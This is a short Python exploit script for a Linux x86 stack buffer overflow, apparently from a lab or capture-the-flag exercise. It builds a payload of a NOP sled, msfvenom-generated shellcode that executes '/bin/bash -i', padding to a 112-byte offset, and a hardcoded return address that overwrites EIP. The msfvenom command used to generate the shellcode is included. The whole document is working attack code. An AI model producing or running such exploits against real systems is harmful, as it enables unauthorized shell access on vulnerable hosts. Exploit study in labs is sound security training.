#!/usr/bin/python
# Overwrite offset, the next 4 bytes after 112 will overwrite the EIP.
# Can be found using pattern create / pattern offset within peda.
offset = 112

# EIP offset = 112
nop_length = 16
nopsled = '\x90' * nop_length

# 75 byte shellcode
# msfvenom -p linux/x86/exec CMD='/bin/bash -i' -f py -b '\x00\x0a'
buf =  b""
buf += b"\xd9\xc3\xbb\x38\x1d\x14\x6a\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x0d\x31\x5a\x17\x03\x5a\x17\x83\xd2\xe1\xf6"
buf += b"\x9f\x48\x11\xaf\xc6\xde\x43\x27\xd4\xbd\x02\x50\x4e"
buf += b"\x6e\x66\xf7\x8f\x18\xa7\x65\xf9\xb6\x3e\x8a\xab\xae"
buf += b"\x4c\x4d\x4c\x2e\x60\x2f\x25\x40\x51\xcd\xd4\xef\xc5"
buf += b"\x31\x3a\x66\x16\x65\x17\xf1\xf7\x44\x17"

padding = 'A' * (offset - nop_length - 75) # EIP offset - nopsled - shellcode length

# 0xffffd020
eip = '\x20\xd0\xff\xff'

print(nopsled + buf + padding + eip)
